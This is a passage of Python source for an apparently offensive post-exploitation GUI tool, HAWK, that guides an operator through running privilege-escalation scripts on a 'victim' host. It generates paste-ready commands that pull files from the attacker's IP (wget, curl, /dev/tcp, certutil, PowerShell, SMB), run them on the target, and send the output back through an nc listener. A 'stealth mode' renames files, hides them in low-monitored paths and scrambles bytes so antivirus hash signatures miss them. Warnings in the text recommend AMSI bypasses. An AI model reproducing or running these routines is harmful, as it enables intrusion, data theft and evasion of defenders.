            ctk.CTkLabel(
                badge_strip,
                text=f"  {dot}  {text}  ",
                font=_f("xs", True),
                text_color=col,
                fg_color=COLORS["bg_card"],
                corner_radius=3,
            ).pack(side="left", padx=(0, 6), pady=2)

        # Description
        ctk.CTkLabel(
            card, text=ti["desc"],
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", wraplength=880, justify="left"
        ).pack(fill="x", padx=10, pady=(2, 4))

        # Details row — Audit / EDR / Coverage only.  Button moved
        # to its own row below (same rationale as the Windows
        # picker): packing everything onto one row pushes the USE
        # THIS TOOL button off-screen when the dialog is narrow.
        det_row = ctk.CTkFrame(card, fg_color="transparent")
        det_row.pack(fill="x", padx=10, pady=(0, 4))
        ctk.CTkLabel(
            det_row, text=f"Audit: {ti['av']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left", padx=(0, 12))
        ctk.CTkLabel(
            det_row, text=f"EDR: {ti['edr']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left", padx=(0, 12))
        ctk.CTkLabel(
            det_row, text=f"Coverage: {ti['coverage']}",
            font=_f("xs"), text_color=COLORS["text_muted"],
            anchor="w").pack(side="left")

        # Dedicated action row — USE THIS TOOL is always visible.
        btn_row = ctk.CTkFrame(card, fg_color="transparent")
        btn_row.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkButton(
            btn_row, text="▶  USE THIS TOOL",
            width=180, height=30,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=lambda t=ti["id"]: _pick(t),
        ).pack(side="right")

    row = _btn_row(win)
    _btn(row, "CANCEL", lambda: _safe_destroy(win), w=140)


class PostExploitGuideDialog:
    """
    Interactive workflow dialog shown automatically after a PEAS-family
    download (linpeas, winpeas, lse, pspy). It turns the five manual steps
    into one-click actions:

        1. ▶ START HTTP SERVER :8000  → xterm `python3 -m http.server` in
           the download dir so the target can pull the file.
        2. COPY TRANSFER  → per-OS commands (wget/curl or certutil/iwr)
           with the Kali IP substituted in, copied to the X11 clipboard.
        3. COPY EXECUTE   → one-liner that runs the tool on-target and
           redirects output to a predictable path.
        4. ▶ START NC LISTENER :9001  → xterm `nc -lnvp 9001 > <name>.out`
           next to where the script is hosted. Pair it with the target-
           side `nc ... < ...` command that the COPY button supplies.
        5. 📂 OPEN RESULT → browse to the exfiltrated file and pipe it
           into the embedded HAWK terminal so the user can read it
           inside the app.

    `script_name` is the actual filename on disk (linpeas.sh / winpeas.bat
    / lse.sh / pspy64). `local_path` is the absolute path of the downloaded
    file on Kali. `target` is the victim IP and `os_type` is 'linux' or
    'windows' (pspy/lse/linpeas → linux, winpeas → windows).
    """

    def __init__(self, parent, script_name: str, local_path: str,
                 target: str, os_type: str = "linux", app=None,
                 stealth_on: bool = False):
        import os as _os
        self._parent = parent
        self._app = app
        self._script_name = script_name
        self._local_path = local_path
        self._local_dir = _os.path.dirname(_os.path.abspath(local_path)) or "."
        self._target = target or "<TARGET>"
        self._os = os_type

        # Detect the Kali IP the target will actually reach.  On a multi-homed
        # Kali the transfer URLs / SMB path must carry the IP of the interface
        # that ROUTES to the target, not the default-route / best-ranked NIC —
        # otherwise the pasted wget/certutil/smbclient points at the wrong NIC
        # and hangs (OBS-2).  Ask the kernel's route to the target first, then
        # fall back to the ranked global lhost when it can't be resolved
        # (target still a placeholder, non-Linux, no `ip`).
        try:
            from utils.runner import route_to_target, lhost_candidates
            route = route_to_target(self._target)
            if route.get("src"):
                self._kali_ip = route["src"]
                self._kali_iface = route.get("iface") or "?"
            else:
                candidates = lhost_candidates()
                self._kali_ip = (candidates[0]["ip"]
                                 if candidates else "<KALI_IP>")
                self._kali_iface = (candidates[0]["iface"]
                                    if candidates else "?")
        except Exception:
            self._kali_ip = "<KALI_IP>"
            self._kali_iface = "?"

        # ─────────────────────────────────────────────────────────────
        # File naming scheme (applies to BAT / EXE / PS1 / SH):
        #
        #   <base>-<ext>-<target>-<YYYYMMDD-HHMMSS>.out
        #
        # e.g.
        #   winpeas-bat-192.168.176.167-20260423-153000.out
        #   winpeas-exe-192.168.176.167-20260423-154215.out
        #   privesccheck-ps1-192.168.176.167-20260423-160022.out
        #   linpeas-sh-192.168.176.167-20260423-161130.out
        #
        # Rationale: the <ext> tag distinguishes .bat vs .exe vs .ps1
        # (which otherwise share the same stem and would overwrite
        # each other), and the timestamp guarantees uniqueness even
        # across multiple runs of the same tool against the same
        # target.  The same name is used on BOTH sides of the wire so
        # the user sees a 1:1 mapping target→kali.
        # ─────────────────────────────────────────────────────────────
        from datetime import datetime as _dt
        _base     = _os.path.splitext(script_name)[0].lower()
        _ext_tag  = (_os.path.splitext(script_name)[1].lstrip(".")
                       or "out").lower()
        _ts       = _dt.now().strftime("%Y%m%d-%H%M%S")
        safe_target = re.sub(r"[^A-Za-z0-9_.-]", "_", self._target)
        _out_stem = f"{_base}-{_ext_tag}-{safe_target}-{_ts}"

        # ─────────────────────────────────────────────────────────────
        # STEALTH MODE integration
        #
        # Read the app-level checkbox (set in target_bar) ONCE at
        # dialog-open time.  If ON, build a StealthContext:
        #   * random-hex binary filename with plausible Windows /
        #     Linux extension
        #   * plausible low-watched path on the target
        #   * byte-scrambled copy of the binary in HAWK's dicts/
        #     directory (what the HTTP server will serve)
        #   * random-hex output filename
        #
        # Every transfer / execute / monitor command later in this
        # dialog reads `self._remote_path` / `self._remote_out` /
        # `self._transfer_name` so a single toggle here swaps the
        # whole workflow into stealth without scattered branches.
        # ─────────────────────────────────────────────────────────────
        # stealth_on is passed by the caller (toggled inside this dialog).
        # The target_bar checkbox has been removed — stealth is a per-workflow
        # opt-in, not a global session setting.
        self._stealth = None

        if stealth_on:
            try:
                from utils.stealth import generate_stealth_context
                # Put the scrambled copy in the SAME directory as
                # the original download — the Step 1 HTTP server
                # serves that dir, so the random-named file shows
                # up alongside the real one and the target can
                # fetch it with a clean `http://kali:8000/<rnd>.tmp`
                # URL (no subdir gymnastics).
                self._stealth = generate_stealth_context(
                    real_tool_name=script_name,
                    ext=_ext_tag,
                    os_type=os_type,
                    local_binary_path=local_path,
                    dicts_dir=self._local_dir,
                )
            except Exception as e:
                print(f"[HAWK] stealth generation failed: {e}")
                self._stealth = None
                stealth_on = False

        if stealth_on and self._stealth is not None:
            # Use stealth paths on target + stealth-named copy for
            # HTTP transfer.  Kali-side exfil filename stays
            # descriptive for the operator's own readability.
            self._remote_path   = self._stealth.remote_bin_path
            self._remote_out    = self._stealth.remote_out_path
            self._transfer_name = self._stealth.scrambled_name
        else:
            # Transparent mode — original paths and filenames.
            if os_type == "linux":
                self._remote_path = f"/tmp/{script_name}"
                self._remote_out  = f"/tmp/{_out_stem}.out"
            else:
                # Public is world-writable on Windows and survives
                # UAC contexts.
                self._remote_path = f"C:\\Windows\\Temp\\{script_name}"
                self._remote_out  = f"C:\\Windows\\Temp\\{_out_stem}.out"
            self._transfer_name = script_name

        # Listener output filename on attacker — always descriptive
        # (stealth is TARGET-side only; operator reads their own
        # files on Kali so readable names win here).
        self._exfil_name = f"{_out_stem}.out"
        self._exfil_path = _os.path.join(self._local_dir, self._exfil_name)

        # Dialog size — user asked for "parecchio grande" so every
        # step fits without scrolling or manual resize.  1280×820 on
        # 1080p leaves breathing room for the stealth banner +
        # all-visible USE/COPY buttons.
        win = _make_win(parent, "PEAS Workflow", 1280, 820)
        self._win = win
        _title(win, f"{script_name.upper()}  —  WORKFLOW")

        # Store params needed to rebuild the dialog when stealth is toggled.
        self._stealth_on_param = stealth_on

        # Header: download confirmation + Kali IP hint
        _note_box(
            win,
            f"✓ Downloaded to: {local_path}\n"
            f"★ Kali: {self._kali_ip}  ({self._kali_iface})"
            f"     Target: {self._target}",
            COLORS["text_green"])

        # ── STEALTH MODE toggle button ─────────────────────────────
        # Stealth mode is now a per-workflow toggle (no longer a global
        # target_bar checkbox).  Clicking when OFF opens an explanation
        # dialog; clicking when ON immediately rebuilds without stealth.
        _stealth_active = self._stealth is not None  # computed below
        _stealth_btn_text = (
            "🕶  STEALTH MODE: ON  — click to disable"
            if stealth_on else
            "🔓  STEALTH MODE: OFF  — click to enable")
        _stealth_btn_color = (
            COLORS["text_cyan"] if stealth_on else COLORS["text_dim"])
        _stealth_btn_border = (
            COLORS["text_cyan"] if stealth_on else COLORS["border_dim"])

        stealth_toggle_btn = ctk.CTkButton(
            win,
            text=_stealth_btn_text,
            width=380, height=26,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold"),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=_stealth_btn_border,
            border_width=1,
            text_color=_stealth_btn_color,
            corner_radius=3,
            command=lambda: self._on_stealth_toggle_btn(stealth_on),
        )
        stealth_toggle_btn.pack(anchor="w", padx=16, pady=(4, 0))

        # ── STEALTH banner — only when stealth mode is active ─────
        # Shown front-and-centre so the operator always knows the
        # workflow is in OPSEC mode + can map random-hex names back
        # to their real-tool identities when reading command lines
        # further down the dialog.
        if self._stealth is not None:
            from utils.stealth import short_hash as _short_hash
            ext_display = (
                f".{self._stealth.random_ext}"
                if self._stealth.random_ext else "")
            _note_box(
                win,
                f"🕶  STEALTH MODE ACTIVE\n\n"
                f"  Real tool           : {self._stealth.real_tool}\n"
                f"  Transfer filename   : "
                f"{self._stealth.scrambled_name}  "
                f"(served via HTTP from Kali)\n"
                f"  Target binary path  : "
                f"{self._stealth.remote_bin_path}\n"
                f"  Target output path  : "
                f"{self._stealth.remote_out_path}\n"
                f"  SHA-256 original    : "
                f"{_short_hash(self._stealth.original_sha256)}\n"
                f"  SHA-256 scrambled   : "
                f"{_short_hash(self._stealth.scrambled_sha256)}  "
                f"(hash-based AV rules MISS)\n"
                f"  Kali exfil file     : {self._exfil_name}  "
                f"(stays descriptive for YOUR readability)",
                COLORS["text_cyan"])

        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"])
        scroll.pack(fill="both", expand=True, padx=16, pady=(4, 4))

        # Build every step inside its own try/except so a bug in
        # ONE section doesn't leave the rest of the dialog blank.
        # Each failure prints a full traceback + surfaces a dim
        # warning in the HAWK terminal so we can pin down the
        # misbehaving step from the log without guesswork.
        _step_builders = (
            ("Step 1 — HOST",     self._build_step1_http),
            ("Step 2 — TRANSFER", self._build_step2_transfer),
            ("Step 3 — EXECUTE",  self._build_step3_execute),
            ("Step 4 — EXFIL",    self._build_step4_exfil),
            ("Step 5 — REVIEW",   self._build_step5_review),
        )
        import traceback as _tb
        for _label, _fn in _step_builders:
            try:
                _fn(scroll)
            except Exception as _e:
                _tb.print_exc()
                try:
                    self._app.terminal.write(
                        f"  [!] PEAS Workflow {_label} render "
                        f"failed: {_e}", "error")
                except Exception:
                    pass
                # Drop a visible stub in the dialog so the user can
                # see *which* step broke without opening the terminal.
                try:
                    ctk.CTkLabel(
                        scroll,
                        text=(f"  ⚠  {_label} render failed: {_e}  "
                              "(see HAWK terminal for traceback)"),
                        font=_f("sm"), text_color=COLORS["text_red"],
                        anchor="w", justify="left",
                        wraplength=1180,
                    ).pack(fill="x", padx=8, pady=(6, 6))
                except Exception:
                    pass

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)

    # ───── Stealth toggle helpers ─────────────────────────────────────────

    def _on_stealth_toggle_btn(self, currently_on: bool):
        """Called when the user clicks the STEALTH MODE toggle button.
        If turning ON → show explanation dialog first.
        If turning OFF → reopen immediately without stealth."""
        if currently_on:
            # Already on → turn off immediately, no explanation needed
            self._reopen_with_stealth(False)
        else:
            # Turning on → show what it will do, ask to confirm
            self._show_stealth_explain_dialog()

    def _show_stealth_explain_dialog(self):
        """Explain exactly what STEALTH MODE will change, then let
        the user confirm (rebuilds the dialog with stealth ON) or cancel."""
        import os as _os
        from utils.stealth import generate_stealth_context

        # Preview the stealth context without writing anything yet
        try:
            preview = generate_stealth_context(
                real_tool_name=self._script_name,
                ext=(_os.path.splitext(self._script_name)[1].lstrip(".")
                     or "out").lower(),
                os_type=self._os,
                local_binary_path=self._local_path,
                dicts_dir=self._local_dir,
            )
        except Exception as e:
            preview = None

        win = _make_win(self._win, "Stealth Mode", 740, 480)
        _title(win, "🕶  STEALTH MODE — what will change")

        scroll = ctk.CTkScrollableFrame(win, fg_color=COLORS["bg_secondary"])
        scroll.pack(fill="both", expand=True, padx=16, pady=(8, 4))

        def _row(label, value, color=None):
            fr = ctk.CTkFrame(scroll, fg_color="transparent")
            fr.pack(fill="x", padx=4, pady=2)
            ctk.CTkLabel(fr, text=f"  {label}", width=220,
                         font=_f("sm"), text_color=COLORS["text_dim"],
                         anchor="w").pack(side="left")
            ctk.CTkLabel(fr, text=value,
                         font=ctk.CTkFont(family="Courier New", size=12),
                         text_color=color or COLORS["text_cyan"],
                         anchor="w", justify="left",
                         wraplength=460).pack(side="left", fill="x")

        ctk.CTkLabel(scroll,
                     text="  When STEALTH MODE is ON, the following changes apply "
                          "to the target-side artefacts of this workflow:",
                     font=_f("sm"), text_color=COLORS["text_dim"],
                     anchor="w", justify="left",
                     wraplength=680).pack(fill="x", padx=4, pady=(4, 8))

        if preview:
            from utils.stealth import short_hash as _sh
            _row("Real tool name:",      self._script_name,
                 COLORS["text_dim"])
            _row("Transfer filename:",   preview.scrambled_name,
                 COLORS["text_cyan"])
            _row("Target binary path:",  preview.remote_bin_path,
                 COLORS["text_cyan"])
            _row("Target output path:",  preview.remote_out_path,
                 COLORS["text_cyan"])
            _row("SHA-256 (original):",  _sh(preview.original_sha256),
                 COLORS["text_dim"])
            _row("SHA-256 (scrambled):", _sh(preview.scrambled_sha256),
                 COLORS["text_green"])
            _row("AV hash match:",       "MISS — signature changed",
                 COLORS["text_green"])
            _row("Kali exfil file:",     self._exfil_name
                                         + "  (stays readable for you)",
                 COLORS["text_dim"])
        else:
            ctk.CTkLabel(scroll,
                         text="  (Could not preview — stealth context "
                              "will be generated on confirm)",
                         font=_f("sm"), text_color=COLORS["text_yellow"],
                         anchor="w").pack(fill="x", padx=4)

        ctk.CTkLabel(scroll,
                     text=("\n  LEVEL 1 — random hex filename on target "
                           "(e.g. a3f7c2d1.tmp)\n"
                           "  LEVEL 2 — binary placed in low-monitored path "
                           "(not C:\\Windows\\Temp)\n"
                           "  LEVEL 3 — trailing bytes scrambled to break "
                           "hash-based AV signatures\n"
                           "  LEVEL 4 — output file also renamed on target\n\n"
                           "  Your Kali-side files keep descriptive names — "
                           "stealth applies only to the target."),
                     font=_f("sm"), text_color=COLORS["text_dim"],
                     anchor="w", justify="left",
                     wraplength=680).pack(fill="x", padx=4, pady=(8, 4))

        btn_row = _btn_row(win)

        def _confirm():
            _safe_destroy(win)
            self._reopen_with_stealth(True)

        _btn(btn_row, "🕶  ENABLE STEALTH MODE", _confirm,
             primary=True, w=220)
        _btn(btn_row, "CANCEL", lambda: _safe_destroy(win), w=100)

    def _reopen_with_stealth(self, enable: bool):
        """Destroy this dialog and reopen it with the opposite stealth setting."""
        parent      = self._parent
        script_name = self._script_name
        local_path  = self._local_path
        target      = self._target
        os_type     = self._os
        app         = self._app
        try:
            _safe_destroy(self._win)
        except Exception:
            pass
        PostExploitGuideDialog(
            parent, script_name=script_name,
            local_path=local_path, target=target,
            os_type=os_type, app=app,
            stealth_on=enable)

    # ───── helpers ────────────────────────────────────────────────────────

    def _section_header(self, parent, n, text):
        f = ctk.CTkFrame(parent, fg_color="transparent")
        f.pack(fill="x", padx=4, pady=(10, 2))
        ctk.CTkLabel(
            f, text=f"  {n}.  {text}",
            font=_f("md", True),
            text_color=COLORS["text_bright"],
            anchor="w").pack(side="left", fill="x", expand=True)
        return f

    def _cmd_row(self, parent, label, command, hint=None):
        """Row: [label] [readonly textbox with command] [COPY]"""
        wrap = ctk.CTkFrame(parent, fg_color="transparent")
        wrap.pack(fill="x", padx=4, pady=3)

        if label:
            ctk.CTkLabel(
                wrap, text=label, width=80,
                font=_f("sm", True),
                text_color=COLORS["text_dim"],
                anchor="w").pack(side="left", padx=(6, 4))

        box = ctk.CTkTextbox(
            wrap, height=30, font=_f("md"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, wrap="none")
        box.pack(side="left", fill="x", expand=True, padx=(0, 6))
        box.insert("1.0", command)
        box.configure(state="disabled")

        def _copy():
            try:
                from utils.clipboard import clipboard_copy
                clipboard_copy(command)
                if self._app and hasattr(self._app, "terminal"):
                    self._app.terminal.write(
                        f"  [+] Copied to clipboard: "
                        f"{command[:60]}{'...' if len(command) > 60 else ''}",
                        "success")
            except Exception:
                pass

        ctk.CTkButton(
            wrap, text="COPY", width=60, height=28,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"],
            corner_radius=3, command=_copy).pack(side="left", padx=(0, 6))

        if hint:
            ctk.CTkLabel(
                parent, text=f"       {hint}",
                font=_f("sm"),
                text_color=COLORS["text_dim"],
                anchor="w").pack(fill="x", padx=4, pady=(0, 2))

    def _action_button(self, parent, text, command, primary=True):
        btn = ctk.CTkButton(
            parent, text=text, height=30,
            font=_f("md", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=(COLORS["border_green"] if primary
                          else COLORS["border_amber"]),
            border_width=1,
            text_color=(COLORS["text_green"] if primary
                        else COLORS["text_yellow"]),
            corner_radius=4, command=command)
        btn.pack(anchor="w", padx=10, pady=(4, 2))
        return btn

    # ───── Step 1: HTTP server ────────────────────────────────────────────

    def _build_step1_http(self, parent):
        self._section_header(parent, 1, "HOST THE FILE (Kali side)")

        def _start_http():
            from utils.runner import _open_terminal
            # When stealth is ON, the file the target should pull is
            # the scrambled copy (random-hex name), NOT the original
            # winpeas.exe / linpeas.sh — otherwise every blue-team
            # HTTP-proxy log would show "winpeas.exe downloaded".
            pull_name = getattr(self, "_transfer_name",
                                self._script_name)
            script = (
                f"echo '═══  HAWK — HTTP server (serving "
                f"{self._local_dir})  ═══'; "
                f"echo 'Target pulls: http://{self._kali_ip}:8000/"
                f"{pull_name}'; echo ''; "
                f"cd {self._local_dir!r} && "
                f"python3 -m http.server 8000; "
                f"read -p 'Press ENTER to close...'")
            ok = _open_terminal("HAWK — HTTP :8000", script)
            if self._app and hasattr(self._app, "terminal"):
                if ok:
                    self._app.terminal.write(
                        f"  [+] HTTP server started on :8000 "
                        f"(serving {self._local_dir})", "success")
                else:
                    self._app.terminal.write(
                        "  [!] Could not open terminal emulator.", "error")

        self._action_button(
            parent, "▶  START HTTP SERVER  :8000", _start_http, primary=True)
        ctk.CTkLabel(
            parent,
            text=f"       Opens xterm and serves {self._local_dir} "
                 f"on http://{self._kali_ip}:8000/",
            font=_f("sm"),
            text_color=COLORS["text_dim"],
            anchor="w").pack(fill="x", padx=4, pady=(0, 4))

    # ───── Step 2: Transfer on target ─────────────────────────────────────

    def _build_step2_transfer(self, parent):
        import os as _os
        import shlex as _shlex
        from utils.config import TMP_DIR as _TMP_DIR

        self._section_header(parent, 2, "TRANSFER TO TARGET (paste in victim shell)")

        # Stealth-aware source filename + local payload path.
        # _transfer_name is the random-hex name when stealth is ON,
        # the real script name when stealth is OFF.  _b64_src is the
        # file Kali base64-encodes — the SCRAMBLED copy when stealth
        # is ON, the original when OFF (pasting a base64 of the
        # un-scrambled binary would defeat the hash-evasion point).
        xfer_name = getattr(self, "_transfer_name", self._script_name)
        if self._stealth is not None:
            b64_src = self._stealth.scrambled_src
            b64_stem = self._stealth.random_name
        else:
            b64_src = self._local_path
            # A plain rsplit handles the single-dot script names
            # (winpeas.exe / linpeas.sh / PrivescCheck.ps1 / pspy64)
            # without changing the visible workflow.
            b64_stem = self._script_name.rsplit(".", 1)[0]

        try:
            _os.makedirs(_TMP_DIR, exist_ok=True)
        except OSError:
            pass
        b64_out = _os.path.join(_TMP_DIR, f"{b64_stem}.b64")
        b64_src_q = _shlex.quote(str(b64_src))
        b64_out_q = _shlex.quote(str(b64_out))

        if self._os == "linux":
            if self._script_name.startswith("pspy"):
                # pspy ships pspy32 (i386/i686) and pspy64 (x86_64) — both are
                # downloaded to payloads/.  The wget/curl rows below default to
                # pspy64; a 32-bit target (`uname -m` = i686 / i386, e.g.
                # Metasploitable) can't execute pspy64 ("cannot execute binary
                # file") and needs pspy32.  Both save to the SAME remote path,
                # so the Step-3 RUN command is unchanged either way.
                self._cmd_row(
                    parent, "wget 32-bit:",
                    f"wget http://{self._kali_ip}:8000/pspy32 "
                    f"-O {self._remote_path} && chmod +x {self._remote_path}",
                    hint="Use INSTEAD of 'wget:' below when the target's "
                         "`uname -m` is i686 / i386 (32-bit).  pspy64 gives "
                         "'cannot execute binary file' on a 32-bit box.")
            self._cmd_row(
                parent, "wget:",
                f"wget http://{self._kali_ip}:8000/{xfer_name} "
                f"-O {self._remote_path} && chmod +x {self._remote_path}")
            self._cmd_row(
                parent, "curl:",
                f"curl -o {self._remote_path} "
                f"http://{self._kali_ip}:8000/{xfer_name} && "
                f"chmod +x {self._remote_path}")
            self._cmd_row(
                parent, "no-tool:",
                f"bash -c 'exec 3<>/dev/tcp/{self._kali_ip}/8000; "
                f"echo -e \"GET /{xfer_name} HTTP/1.0\\r\\n\\r\\n\" >&3; "
                f"(head -1 <&3 >/dev/null; while IFS= read -r l <&3; "
                f"do [ \"$l\" = $'\\r' ] && break; done; cat <&3) > "
                f"{self._remote_path}' && chmod +x {self._remote_path}",
                hint="Fallback if wget/curl are absent")
            self._cmd_row(
                parent, "B64 (Kali):",
                f"base64 -w0 {b64_src_q} > "
                f"{b64_out_q} && "
                f"wc -c {b64_out_q}",
                hint="Generate base64 on Kali — copy the content of "
                     "hawkc/tmp/*.b64 into the target shell variable")
            self._cmd_row(
                parent, "B64 (target):",
                f"echo '<PASTE_B64_HERE>' | base64 -d > "
                f"{self._remote_path} && "
                f"chmod +x {self._remote_path}",
                hint="Run on target — decodes the base64 back to the "
                     "script.  Works in any busybox/ash/bash, no "
                     "network required.")
        else:
            self._cmd_row(
                parent, "certutil:",
                f"certutil -urlcache -split -f "
                f"http://{self._kali_ip}:8000/{xfer_name} "
                f"{self._remote_path}",
                hint="Works on plain cmd.exe, even on legacy Windows")
            self._cmd_row(
                parent, "PS iwr:",
                f"powershell -c \"iwr http://{self._kali_ip}:8000/"
                f"{xfer_name} -OutFile {self._remote_path}\"",
                hint="Modern PowerShell (≥ 3.0) — native, no extra tooling")
            self._cmd_row(
                parent, "PS WebCl:",
                f"powershell -c \"(New-Object Net.WebClient).DownloadFile("
                f"'http://{self._kali_ip}:8000/{xfer_name}',"
                f"'{self._remote_path}')\"",
                hint="Older PowerShell without iwr")
            self._cmd_row(
                parent, "PS BITS:",
                f"powershell -c \"Import-Module BitsTransfer; "
                f"Start-BitsTransfer -Source "
                f"'http://{self._kali_ip}:8000/{xfer_name}' "
                f"-Destination '{self._remote_path}'\"",
                hint="Background Intelligent Transfer Service — "
                     "often whitelisted when iwr is blocked")
            self._cmd_row(
                parent, "SMB (Kali):",
                f"impacket-smbserver HAWK {self._local_dir!r} "
                f"-smb2support",
                hint="Run on Kali FIRST — serves the download dir as "
                     "share 'HAWK' over SMB")
            self._cmd_row(
                parent, "SMB copy:",
                f"copy \\\\{self._kali_ip}\\HAWK\\{xfer_name} "
                f"{self._remote_path}",
                hint="Then on target: grabs the file over SMB "
                     "(works on cmd.exe, no PowerShell needed)")
            self._cmd_row(
                parent, "B64 (Kali):",
                f"base64 -w0 {b64_src_q} > "
                f"{b64_out_q} && "
                f"wc -c {b64_out_q}",
                hint="Generate base64 on Kali — paste the hawkc/tmp/*.b64 "
                     "contents into the target shell variable")
            self._cmd_row(
                parent, "B64 (target):",
                f"powershell -c \"$b=[Convert]::FromBase64String('<PASTE_B64_HERE>'); "
                f"[IO.File]::WriteAllBytes('{self._remote_path}',$b)\"",
                hint="Run on target — decodes the base64 string back "
                     "to the binary.  Use when outbound network is "
                     "fully blocked (air-gapped-ish targets).")

    # ───── Step 3: Execute on target ──────────────────────────────────────

    def _build_step3_execute(self, parent):
        self._section_header(
            parent, 3,
            "EXECUTE ON TARGET (paste in the target shell)")
        # Small intro paragraph explaining what the commands below
        # actually do — the old header "EXECUTE & MONITOR" was
        # ambiguous enough that users missed this was the run step.
        ctk.CTkLabel(
            parent,
            text=(
                "       These commands RUN the tool on the target "
                "and capture its output to a file you can exfiltrate "
                "in Step 4.\n"
                "       Pick cmd.exe OR PowerShell depending on the "
                "shell you have, then paste + Enter.  The MONITOR "
                "block is a SECOND shell that watches the output "
                "file grow — it doesn't run the tool."),
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", justify="left", wraplength=1180,
        ).pack(fill="x", padx=4, pady=(0, 6))

        # ── Duration / detection warning ──────────────────────────────────
        if self._script_name.lower().startswith("winpeas"):
            is_bat = self._script_name.lower().endswith(".bat")
            is_ps1 = self._script_name.lower().endswith(".ps1")
            if is_bat:
                warn_text = (
                    "⏱  Expected duration: 20-40 min on Windows Server 2008/2012\n"
                    "📦  Output file size when complete: ~1-2 MB\n"
                    "🛡  AV detection: LOW — batch script, no binary signature\n"
                    "⚠   The shell will appear frozen — this is NORMAL. winpeas runs\n"
                    "    hundreds of commands sequentially. Do not interrupt unless\n"
                    "    the file size (see monitor below) stops growing for 10+ min."
                )
                warn_color = COLORS["text_yellow"]
            elif is_ps1:
                # Invoke-WinPEAS.ps1 (the PowerShell port).  No .NET 4
                # dependency, but requires PS 5.0+ (i.e. Win 10 /
                # Server 2016+ by default, PS 2.0 default on Win 7 /
                # Server 2008 R2 is too old).
                warn_text = (
                    "⏱  Expected duration: 3-6 min (PowerShell port)\n"
                    "📦  Output file size when complete: ~300-800 KB\n"
                    "🛡  AV detection: LOW — PowerShell in-memory / on-disk,\n"
                    "    no binary signature to match.  AMSI may still fire on\n"
                    "    strings inside the script — add the AMSI bypass line\n"
                    "    before dot-sourcing if Defender flags it.\n"
                    "⚠   Requires PowerShell 5.0+ on the target.  Default\n"
                    "    installs of Windows 7, Server 2008 R2 and older ship\n"
                    "    with PS 2.0 — the script WILL syntax-error there.\n"
                    "    Use winpeas.bat on legacy targets."
                )
                warn_color = COLORS["text_green"]
            else:
                warn_text = (
                    "⏱  Expected duration: 2-4 min (compiled binary, much faster)\n"
                    "📦  Output file size when complete: ~300-800 KB\n"
                    "🔴  AV detection: HIGH — winpeas.exe is in every AV database.\n"
                    "    Windows Defender WILL block it. Use only with AV disabled\n"
                    "    or already bypassed. If blocked, switch to PrivescCheck.\n"
                    "⚠   winpeas.exe REQUIRES .NET 4+ on the target.  Default\n"
                    "    installs of Windows 7 / Server 2008 R2 / older ship .NET\n"
                    "    3.5 only — the binary loads silently and produces a\n"
                    "    0-byte output file.  For legacy targets use winpeas.bat\n"
                    "    or the Invoke-WinPEAS.ps1 variant (from the preflight).\n"
                    "⚠   Many checks need local admin or NT AUTHORITY\\SYSTEM\n"
                    "    (registry ACLs, protected processes, token dumps).  If your\n"
                    "    target shell is a service account, get SYSTEM first with a\n"
                    "    Potato variant (see button below)."
                )
                warn_color = COLORS["text_red"]
        elif self._script_name.lower().startswith("privesccheck"):
            warn_text = (
                "⏱  Expected duration: 2-4 min\n"
                "📦  Output: HTML + CSV report (~150-500 KB) if -Report flag used\n"
                "🛡  AV detection: LOW — runs in PowerShell memory, no binary on disk\n"
                "⚠   AMSI bypass is included in the execution command below.\n"
                "    If PowerShell execution policy blocks it, use: Set-ExecutionPolicy\n"
                "    Bypass -Scope Process -Force  (in the target shell first)"
            )
            warn_color = COLORS["text_green"]
        elif self._script_name.lower().startswith("powerup"):
            warn_text = (
                "⏱  Expected duration: 1-3 min (lightweight, fast checks)\n"
                "📦  Output file size when complete: ~20-80 KB (short, human-readable)\n"
                "🟡  AV detection: MEDIUM — PowerShell on disk may trigger AMSI\n"
                "    on keyword matching (e.g. 'Invoke-AllChecks', 'ServicePath').\n"
                "    Use the AMSI bypass variant if Defender flags the script load.\n"
                "⚠   Requires ExecutionPolicy Bypass — all commands below include it.\n"
                "ℹ   Output is human-readable plain text.  Look for lines marked\n"
                "    [+] Vulnerable — each one is an actionable privesc vector.\n"
                "    The AbuseFunction field gives you the exact exploit command."
            )
            warn_color = COLORS["text_yellow"]
        elif self._script_name.lower().startswith("linpeas"):
            warn_text = (
                "⏱  Expected duration: 5-15 min on typical Linux targets\n"
                "📦  Output file size when complete: ~200-800 KB\n"
                "🛡  AV detection: LOW on Linux (most targets have no AV)\n"
                "⚠   The shell will appear frozen — output is redirected to file."
            )
            warn_color = COLORS["text_dim"]
        else:
            warn_text = (
                "⏱  Expected duration: varies by tool\n"
                "⚠   The shell may appear frozen while the tool runs — this is normal."
            )
            warn_color = COLORS["text_dim"]

        warn_box = ctk.CTkFrame(parent, fg_color=COLORS["bg_card"],
                                 border_color=warn_color,
                                 border_width=1, corner_radius=4)
        warn_box.pack(fill="x", padx=4, pady=(4, 8))
        ctk.CTkLabel(warn_box, text=warn_text,
                     font=_f("sm"), text_color=warn_color,
                     anchor="w", justify="left", wraplength=680
                     ).pack(fill="x", padx=10, pady=8)

        # SYSTEM-elevation shortcut — only surfaced on .exe where the
        # need is real (many winpeas.exe checks silently return empty
        # or error out when run as a non-privileged user).  Clicking
        # opens the Potato picker dialog that HAWK ships so the
        # operator can download the right variant and generate a
        # paste-ready exec command without leaving this workflow.
        if (self._script_name.lower().startswith("winpeas")
                and self._script_name.lower().endswith(".exe")):
            def _open_potato():
                try:
                    show_potato_picker_dialog(self._win, self._app)
                except Exception as e:
